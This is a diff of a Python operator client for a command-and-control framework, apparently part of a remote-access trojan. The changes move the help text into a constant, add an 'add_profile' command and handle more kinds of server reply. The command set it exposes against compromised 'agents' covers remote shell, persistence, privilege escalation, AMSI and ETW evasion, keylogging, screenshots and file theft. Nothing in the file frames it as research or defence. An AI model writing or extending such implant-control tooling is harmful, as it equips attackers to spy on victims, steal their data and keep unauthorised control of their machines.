@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """Remote operator CLI - connects to server's operator port with RBAC login."""
-import socket, json, sys, getpass, base64, os
+import socket, json, sys, getpass, base64
 from common import recv_msg, send_msg
 
 
@@ -11,6 +11,13 @@ def send(sock, obj):
 def recv(sock):
     raw = recv_msg(sock)
     return json.loads(raw) if raw else None
+
+
+HELP = """list | use <id> | back | shell <cmd> | sysinfo | ps | env |
+download <path> | upload <local> <remote> | persist <kind> |
+screenshot | privesc | amsi | etw | keylog_start | keylog_dump |
+keylog_stop | results | list_operators | add_operator <u> <p> <role> |
+remove_operator <u> | list_profiles | add_profile <path.json> | help | exit"""
 
 
 def main():
@@ -40,14 +47,10 @@ def main():
             name = parts[0].lower()
             if name == "exit":
                 return
-            cmd = {"cmd": name}
             if name == "help":
-                print("list | use <id> | back | shell <cmd> | sysinfo | ps | env |\n"
-                      "download <path> | upload <local> <remote> | persist <kind> |\n"
-                      "screenshot | privesc | amsi | etw | keylog_start | keylog_dump |\n"
-                      "keylog_stop | results | list_operators | add_operator <u> <p> <role> |\n"
-                      "remove_operator <u> | list_profiles | exit")
+                print(HELP)
                 continue
+            cmd = {"cmd": name}
             if name == "use":
                 cmd["agent_id"] = parts[1] if len(parts) > 1 else ""
             elif name == "shell" and len(parts) > 1:
@@ -70,6 +73,8 @@ def main():
                 cmd["role"] = parts[3] if len(parts) > 3 else "operator"
             elif name == "remove_operator" and len(parts) > 1:
                 cmd["username"] = parts[1]
+            elif name == "add_profile" and len(parts) > 1:
+                cmd["path"] = parts[1]
 
             send(sock, cmd)
             resp = recv(sock)
@@ -83,6 +88,8 @@ def main():
                 cur_agent = resp["agent_id"]
                 print(f"[*] selected {cur_agent[:8]}")
             elif "agents" in resp:
+                if not resp["agents"]:
+                    print("[*] no agents")
                 for a in resp["agents"]:
                     st = "alive" if a["connected"] else "dead"
                     print(f"{a['id'][:8]}  {st:5}  {a['hostname']:20}  "
@@ -101,6 +108,8 @@ def main():
                     print(f"  {p['name']:15} {p['register_uri']}")
             elif "task_id" in resp:
                 print(f"[*] queued {resp['command']} ({resp['task_id'][:8]})")
+            elif "msg" in resp:
+                print(f"[*] {resp['msg']}")
             else:
                 print(resp)
         except KeyboardInterrupt:
